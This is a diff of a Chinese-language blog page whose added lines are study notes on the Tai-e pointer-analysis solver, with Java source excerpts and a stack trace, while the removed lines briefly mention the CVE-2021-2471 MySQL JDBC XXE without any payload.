class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>类似的逻辑，不赘述</p>
+<p><img src="/images/pasted-779.png" alt="upload successful"></p>
+<h4 id="processArrayStore-CSVar-arrayVar-PointsToSet-pts"><a href="#processArrayStore-CSVar-arrayVar-PointsToSet-pts" class="headerlink" title="processArrayStore(CSVar arrayVar, PointsToSet pts)"></a>processArrayStore(CSVar arrayVar, PointsToSet pts)</h4><p>ArrayStore 与FieldStore类似</p>
+<ul>
+<li><p>store field: v.f = x;</p>
+</li>
+<li><p>store array: v[i] = x;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processArrayStore</span><span class="params">(CSVar arrayVar, PointsToSet pts)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> arrayVar.getContext();</span><br><span class="line">    <span class="type">Var</span> <span class="variable">var</span> <span class="operator">=</span> arrayVar.getVar();</span><br><span class="line">    <span class="keyword">for</span> (StoreArray store : <span class="keyword">var</span>.getStoreArrays()) &#123;</span><br><span class="line">        <span class="type">Var</span> <span class="variable">rvalue</span> <span class="operator">=</span> store.getRValue();</span><br><span class="line">        <span class="keyword">if</span> (propTypes.isAllowed(rvalue)) &#123;</span><br><span class="line">            <span class="type">CSVar</span> <span class="variable">from</span> <span class="operator">=</span> csManager.getCSVar(context, rvalue);</span><br><span class="line">            pts.forEach(array -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (array.getObject().isFunctional()) &#123;</span><br><span class="line">                    <span class="type">ArrayIndex</span> <span class="variable">arrayIndex</span> <span class="operator">=</span> csManager.getArrayIndex(array);</span><br><span class="line">                    <span class="comment">// we need type guard for array stores as Java arrays</span></span><br><span class="line">                    <span class="comment">// are covariant</span></span><br><span class="line">                    addPFGEdge(from, arrayIndex,</span><br><span class="line">                            FlowKind.ARRAY_STORE, arrayIndex.getType());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-780.png" alt="upload successful"></p>
+</li>
+<li><p>注意$r5原本的pts，是个newarray</p>
+</li>
+<li><p>$r5[%intconst0] = %classconst2</p>
+</li>
+</ul>
+<p>那么同样还是store的逻辑</p>
+<ul>
+<li>from 是 %classconst2</li>
+<li>target 是$r5[%intconst0]<blockquote>
+<p>注：原课件中只有考虑InstanceField的情况，并没有考虑Array[i]元素，大同小异。<br>疑问：除了Array还有Map、Collection之类的基础结构，Array支持吗？</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="processArrayLoad-CSVar-arrayVar-PointsToSet-pts"><a href="#processArrayLoad-CSVar-arrayVar-PointsToSet-pts" class="headerlink" title="processArrayLoad(CSVar arrayVar, PointsToSet pts)"></a>processArrayLoad(CSVar arrayVar, PointsToSet pts)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processArrayLoad</span><span class="params">(CSVar arrayVar, PointsToSet pts)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> arrayVar.getContext();</span><br><span class="line">    <span class="type">Var</span> <span class="variable">var</span> <span class="operator">=</span> arrayVar.getVar();</span><br><span class="line">    <span class="keyword">for</span> (LoadArray load : <span class="keyword">var</span>.getLoadArrays()) &#123;</span><br><span class="line">        <span class="type">Var</span> <span class="variable">lvalue</span> <span class="operator">=</span> load.getLValue();</span><br><span class="line">        <span class="keyword">if</span> (propTypes.isAllowed(lvalue)) &#123;</span><br><span class="line">            <span class="type">CSVar</span> <span class="variable">to</span> <span class="operator">=</span> csManager.getCSVar(context, lvalue);</span><br><span class="line">            pts.forEach(array -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (array.getObject().isFunctional()) &#123;</span><br><span class="line">                    <span class="type">ArrayIndex</span> <span class="variable">arrayIndex</span> <span class="operator">=</span> csManager.getArrayIndex(array);</span><br><span class="line">                    addPFGEdge(arrayIndex, to, FlowKind.ARRAY_LOAD);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-781.png" alt="upload successful"></p>
+<p>同样的，对于r1 = r0[%intconst0]</p>
+<ul>
+<li>from 是r0[%intconst0]</li>
+<li>target 是r1</li>
+</ul>
+<h4 id="processCall-CSVar-recv-PointsToSet-pts"><a href="#processCall-CSVar-recv-PointsToSet-pts" class="headerlink" title="processCall(CSVar recv, PointsToSet pts)"></a>processCall(CSVar recv, PointsToSet pts)</h4><p><img src="/images/pasted-782.png" alt="upload successful"></p>
+<p>Call过程是最复杂的，以示例代码中的tt为例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line"><span class="type">String</span> <span class="variable">methodNmae</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line"><span class="type">InvokeDemo</span> <span class="variable">tt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokeDemo</span>(content);</span><br><span class="line"><span class="comment">// 1. 测试污点为参数</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> tt.getClass().getMethod(<span class="string">&quot;echo&quot;</span>, String.class);</span><br><span class="line">method.invoke(tt, content);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 测试污点为method</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> tt.getClass().getMethod(methodNmae);</span><br><span class="line">method2.invoke(tt);</span><br><span class="line">upload successful</span><br></pre></td></tr></table></figure>
+<p>和它相关的有三个invoke。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processCall</span><span class="params">(CSVar recv, PointsToSet pts)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> recv.getContext();</span><br><span class="line">    <span class="type">Var</span> <span class="variable">var</span> <span class="operator">=</span> recv.getVar();</span><br><span class="line">    <span class="keyword">for</span> (Invoke callSite : <span class="keyword">var</span>.getInvokes()) &#123;</span><br><span class="line">        pts.forEach(recvObj -&gt; &#123;</span><br><span class="line">            <span class="comment">// resolve callee</span></span><br><span class="line">            <span class="comment">// 获取method</span></span><br><span class="line">            <span class="type">JMethod</span> <span class="variable">callee</span> <span class="operator">=</span> CallGraphs.resolveCallee(</span><br><span class="line">                    recvObj.getObject().getType(), callSite);</span><br><span class="line">            <span class="keyword">if</span> (callee != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// select context</span></span><br><span class="line">                <span class="comment">// 获取method上下文</span></span><br><span class="line">                <span class="comment">// 注意这里method上下文的获取方式，后续上下文敏感再详细跟踪</span></span><br><span class="line">                <span class="type">CSCallSite</span> <span class="variable">csCallSite</span> <span class="operator">=</span> csManager.getCSCallSite(context, callSite);</span><br><span class="line">                <span class="type">Context</span> <span class="variable">calleeContext</span> <span class="operator">=</span> contextSelector.selectContext(</span><br><span class="line">                        csCallSite, recvObj, callee);</span><br><span class="line">                <span class="comment">// build call edge</span></span><br><span class="line">                <span class="type">CSMethod</span> <span class="variable">csCallee</span> <span class="operator">=</span> csManager.getCSMethod(calleeContext, callee);</span><br><span class="line">                <span class="comment">// 增加一条CallEdge，放入WorkList</span></span><br><span class="line">                addCallEdge(<span class="keyword">new</span> <span class="title class_">Edge</span>&lt;&gt;(CallGraphs.getCallKind(callSite),</span><br><span class="line">                        csCallSite, csCallee));</span><br><span class="line">                <span class="comment">// pass receiver object to *this* variable</span></span><br><span class="line">                <span class="comment">// </span></span><br><span class="line">                <span class="keyword">if</span> (!isIgnored(callee)) &#123;</span><br><span class="line">                	<span class="comment">// 这个逻辑还是比较简单的，没有想象中复杂</span></span><br><span class="line">                    <span class="comment">// 就是将method里面的this，指向调用者原本的pts</span></span><br><span class="line">                    addVarPointsTo(calleeContext, callee.getIR().getThis(),</span><br><span class="line">                            recvObj);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                plugin.onUnresolvedCall(recvObj, context, callSite);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>详细看看isIgnored逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isIgnored</span><span class="params">(JMethod method)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ignoredMethods.contains(method) ||</span><br><span class="line">            onlyApp &amp;&amp; !method.isApplication();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-783.png" alt="upload successful"></p>
+<ul>
+<li>内置黑名单</li>
+<li>如果配置了onlyApp参数，那么只分析app内部代码，不分析考虑jdk等代码</li>
+</ul>
+<p>如果不涉及native代码，onlyApp=false，那么可以分析出jdk内部的传播（CodeQL是不会去分析jdk代码的，因此需要自己完善jdk里面的污点传播关系）</p>
 <ol>
-<li><p>CVE-2021-2471 mysql jdbc xxe在HITB ppt里面，没有讲DOMSource XXE这一部分，原因应该是pyn3rd师傅提漏洞还未公开，没写在ppt里面。所以这个洞有两个东西：</p>
-<p> a. DOMSource XXE, 影响所有版本，官方8.0.27中修复掉了</p>
-<p> b. Fabric XXE, 影响5.x, 在5.1.49中修复</p>
-</li>
-<li><p>CodeQL CWE-611有XXE的检测poc，不过source源不支持mysql。</p>
-</li>
+<li>addCallEdge<br> <img src="/images/pasted-784.png" alt="upload successful"></li>
+<li>addVarPointsTo<br> <img src="/images/pasted-785.png" alt="upload successful"></li>
 </ol>
-<h2 id="CVE-2021-2471"><a href="#CVE-2021-2471" class="headerlink" title="CVE-2021-2471"></a>CVE-2021-2471</h2><h3 id="DOMSource-XXE"><a href="#DOMSource-XXE" class="headerlink" title="DOMSource XXE"></a>DOMSource XXE</h3><p>漏洞代码在 com.mysql.cj.jdbc.MysqlSQLXML#getSource</p>
+<blockquote>
+<p>疑问：这些个workList pointerEntry 是哪里添加的？尤其这个invoke类型</p>
+</blockquote>
+<p>综合来讲，processCall只是添加了一个函数内部this-&gt;obj的workList.pointerEntry，更复杂的在processCallEdge。</p>
+<h4 id="addCSMethod-CSMethod-csMethod"><a href="#addCSMethod-CSMethod-csMethod" class="headerlink" title="addCSMethod(CSMethod csMethod)"></a>addCSMethod(CSMethod csMethod)</h4><p>答案是在前文提到的addEntryPoint中，有一步是addCSMethod(csEntryMethod)，最终会执行stmtProcessor.process(csMethod, stmts);</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCSMethod</span><span class="params">(CSMethod csMethod)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (callGraph.addReachableMethod(csMethod)) &#123;</span><br><span class="line">        <span class="comment">// process new reachable context-sensitive method</span></span><br><span class="line">        <span class="type">JMethod</span> <span class="variable">method</span> <span class="operator">=</span> csMethod.getMethod();</span><br><span class="line">        <span class="keyword">if</span> (isIgnored(method)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        processNewMethod(method);</span><br><span class="line">        addStmts(csMethod, method.getIR().getStmts());</span><br><span class="line">        plugin.onNewCSMethod(csMethod);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addStmts</span><span class="params">(CSMethod csMethod, Collection&lt;Stmt&gt; stmts)</span> &#123;</span><br><span class="line">    stmtProcessor.process(csMethod, stmts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>详细逻辑下面StmtProcess讲，堆栈如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">addPointsTo:734, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addPointsTo:741, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addPointsTo:746, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addVarPointsTo:761, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">visit:587, DefaultSolver$StmtProcessor$Visitor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">visit:570, DefaultSolver$StmtProcessor$Visitor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">accept:55, New (pascal.taie.ir.stmt)</span><br><span class="line">lambda$process$0:564, DefaultSolver$StmtProcessor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">accept:-1, DefaultSolver$StmtProcessor$$Lambda$324/0x0000000800ef54e0 (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">forEach:75, Iterable (java.lang)</span><br><span class="line">process:564, DefaultSolver$StmtProcessor (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addStmts:827, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addCSMethod:820, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">addEntryPoint:787, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">onStart:59, EntryPointHandler (pascal.taie.analysis.pta.plugin)</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-4-StmtProcess"><a href="#4-4-StmtProcess" class="headerlink" title="4.4 StmtProcess"></a>4.4 StmtProcess</h2><p>背景是addEntryPoint-&gt;addCSMethod，简单来讲addCSMethod中有一步就是解析所有的子IR，放入workList。</p>
+<p>其中用到了StmtProcess$Vistor，它针对不同的stmt IR，有不同的Visit接口</p>
+<ul>
+<li>New</li>
+<li>Copy</li>
+<li>Cast</li>
+<li>LoadField</li>
+<li>StoreField</li>
+<li>Invoke</li>
+</ul>
+<p><img src="/images/pasted-786.png" alt="upload successful"></p>
+<p>注：这个PFG边的逻辑才是Tai-e中实现的，还有一种图示，是oi-&gt;oj的指向。</p>
+<h2 id="4-1-Visitor-API"><a href="#4-1-Visitor-API" class="headerlink" title="4.1 Visitor API"></a>4.1 Visitor API</h2><h3 id="visit-New-stmt"><a href="#visit-New-stmt" class="headerlink" title="visit(New stmt)"></a>visit(New stmt)</h3><p>New 类型逻辑是简单的，添加workList pointerEntry</p>
+<ul>
+<li>var 为stmt的左值</li>
+<li>obj 比较复杂，因为是new 了一个新的对象，因此需要根据该对象的类型，生成一个obj<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">visit</span><span class="params">(New stmt)</span> &#123;</span><br><span class="line">    <span class="comment">// obtain context-sensitive heap object</span></span><br><span class="line">    <span class="type">NewExp</span> <span class="variable">rvalue</span> <span class="operator">=</span> stmt.getRValue();</span><br><span class="line">    <span class="comment">// 重点：从stmt生成Obj</span></span><br><span class="line">    <span class="comment">// 新生成的obj，也会被放在heapModel中</span></span><br><span class="line">    <span class="type">Obj</span> <span class="variable">obj</span> <span class="operator">=</span> heapModel.getObj(stmt);</span><br><span class="line">    <span class="type">Context</span> <span class="variable">heapContext</span> <span class="operator">=</span> contextSelector.selectHeapContext(csMethod, obj);</span><br><span class="line">    <span class="comment">// 添加workList</span></span><br><span class="line">    addVarPointsTo(context, stmt.getLValue(), heapContext, obj);</span><br><span class="line">    <span class="comment">// 如果右边的值是一个Array类型，会进一步处理Array相关</span></span><br><span class="line">    <span class="keyword">if</span> (rvalue <span class="keyword">instanceof</span> NewMultiArray) &#123;</span><br><span class="line">        processNewMultiArray(stmt, heapContext, obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果是Finalize，再说</span></span><br><span class="line">    <span class="keyword">if</span> (hasOverriddenFinalize(rvalue)) &#123;</span><br><span class="line">        processFinalizer(stmt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+根据stmt生成obj的具体逻辑如下（部分逻辑可以在options中配置）</li>
+</ul>
+<p>AbstractHeapModel</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Obj <span class="title function_">getObj</span><span class="params">(New allocSite)</span> &#123;</span><br><span class="line">    <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> allocSite.getRValue().getType();</span><br><span class="line">    <span class="keyword">if</span> (isMergeStringObjects &amp;&amp; type.equals(string)) &#123;</span><br><span class="line">        <span class="keyword">return</span> getMergedObj(allocSite);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isMergeStringBuilders &amp;&amp;</span><br><span class="line">            (type.equals(stringBuilder) || type.equals(stringBuffer))) &#123;</span><br><span class="line">        <span class="keyword">return</span> getMergedObj(allocSite);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isMergeExceptionObjects &amp;&amp; typeSystem.isSubtype(throwable, type)) &#123;</span><br><span class="line">        <span class="keyword">return</span> getMergedObj(allocSite);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> doGetObj(allocSite);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>AllocationSiteBasedModel</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Obj <span class="title function_">doGetObj</span><span class="params">(New allocSite)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getNewObj(allocSite);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>AbstractHeapModel</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> NewObj <span class="title function_">getNewObj</span><span class="params">(New allocSite)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> newObjs.computeIfAbsent(allocSite,</span><br><span class="line">            site -&gt; add(<span class="keyword">new</span> <span class="title class_">NewObj</span>(site)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Obj</span>&gt; T <span class="title function_">add</span><span class="params">(T obj)</span> &#123;</span><br><span class="line">    objs.add(obj);</span><br><span class="line">    obj.setIndex(counter++);</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NewObj(New allocSite) &#123;</span><br><span class="line">    <span class="built_in">this</span>.allocSite = allocSite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Demo:<br>stmt: $r3 = new InvokeDemo</p>
+<p><img src="/images/pasted-787.png" alt="upload successful"><br>注意：此处新生成的obj，已经被放置在heapModel中了</p>
+<blockquote>
+<p>TODO: 未深入跟踪Array的处理和Finalize的处理，有空再做</p>
+</blockquote>
+<h3 id="visit-Copy-stmt"><a href="#visit-Copy-stmt" class="headerlink" title="visit(Copy stmt)"></a>visit(Copy stmt)</h3><p><img src="/images/pasted-788.png" alt="upload successful"></p>
+<p>copy最简单，只需要</p>
+<p>增加一条PFG边（addPFGEdge 会间接调用addPointsTo）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">visit</span><span class="params">(Copy stmt)</span> &#123;</span><br><span class="line">    <span class="type">Var</span> <span class="variable">rvalue</span> <span class="operator">=</span> stmt.getRValue();</span><br><span class="line">    <span class="keyword">if</span> (propTypes.isAllowed(rvalue)) &#123;</span><br><span class="line">        <span class="type">CSVar</span> <span class="variable">from</span> <span class="operator">=</span> csManager.getCSVar(context, rvalue);</span><br><span class="line">        <span class="type">CSVar</span> <span class="variable">to</span> <span class="operator">=</span> csManager.getCSVar(context, stmt.getLValue());</span><br><span class="line">        addPFGEdge(from, to, FlowKind.LOCAL_ASSIGN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="visit-LoadField-stmt"><a href="#visit-LoadField-stmt" class="headerlink" title="visit(LoadField stmt)"></a>visit(LoadField stmt)</h3><p><img src="/images/pasted-789.png" alt="upload successful"></p>
+<p>同样的，增加一条PFG边</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">visit</span><span class="params">(LoadField stmt)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (stmt.isStatic() &amp;&amp; propTypes.isAllowed(stmt.getRValue())) &#123;</span><br><span class="line">        <span class="type">JField</span> <span class="variable">field</span> <span class="operator">=</span> stmt.getFieldRef().resolve();</span><br><span class="line">        <span class="type">StaticField</span> <span class="variable">sfield</span> <span class="operator">=</span> csManager.getStaticField(field);</span><br><span class="line">        <span class="type">CSVar</span> <span class="variable">to</span> <span class="operator">=</span> csManager.getCSVar(context, stmt.getLValue());</span><br><span class="line">        addPFGEdge(sfield, to, FlowKind.STATIC_LOAD);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="visit-StoreField-stmt"><a href="#visit-StoreField-stmt" class="headerlink" title="visit(StoreField stmt)"></a>visit(StoreField stmt)</h3><p><img src="/images/pasted-790.png" alt="upload successful"></p>
+<p>同样的，增加一条PFG边</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">visit</span><span class="params">(StoreField stmt)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (stmt.isStatic() &amp;&amp; propTypes.isAllowed(stmt.getRValue())) &#123;</span><br><span class="line">        <span class="type">JField</span> <span class="variable">field</span> <span class="operator">=</span> stmt.getFieldRef().resolve();</span><br><span class="line">        <span class="type">StaticField</span> <span class="variable">sfield</span> <span class="operator">=</span> csManager.getStaticField(field);</span><br><span class="line">        <span class="type">CSVar</span> <span class="variable">from</span> <span class="operator">=</span> csManager.getCSVar(context, stmt.getRValue());</span><br><span class="line">        addPFGEdge(from, sfield, FlowKind.STATIC_STORE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="visit-Invoke-stmt"><a href="#visit-Invoke-stmt" class="headerlink" title="visit(Invoke stmt)"></a>visit(Invoke stmt)</h3><p><img src="/images/pasted-791.png" alt="upload successful"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">visit</span><span class="params">(Invoke stmt)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (stmt.isStatic()) &#123;</span><br><span class="line">        processInvokeStatic(stmt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processInvokeStatic</span><span class="params">(Invoke callSite)</span> &#123;</span><br><span class="line">    <span class="type">JMethod</span> <span class="variable">callee</span> <span class="operator">=</span> CallGraphs.resolveCallee(<span class="literal">null</span>, callSite);</span><br><span class="line">    <span class="keyword">if</span> (callee != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">CSCallSite</span> <span class="variable">csCallSite</span> <span class="operator">=</span> csManager.getCSCallSite(context, callSite);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">calleeCtx</span> <span class="operator">=</span> contextSelector.selectContext(csCallSite, callee);</span><br><span class="line">        <span class="type">CSMethod</span> <span class="variable">csCallee</span> <span class="operator">=</span> csManager.getCSMethod(calleeCtx, callee);</span><br><span class="line">        <span class="comment">// 增加一条调用边，交由processCallEdge去处理</span></span><br><span class="line">        addCallEdge(<span class="keyword">new</span> <span class="title class_">Edge</span>&lt;&gt;(CallKind.STATIC, csCallSite, csCallee));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
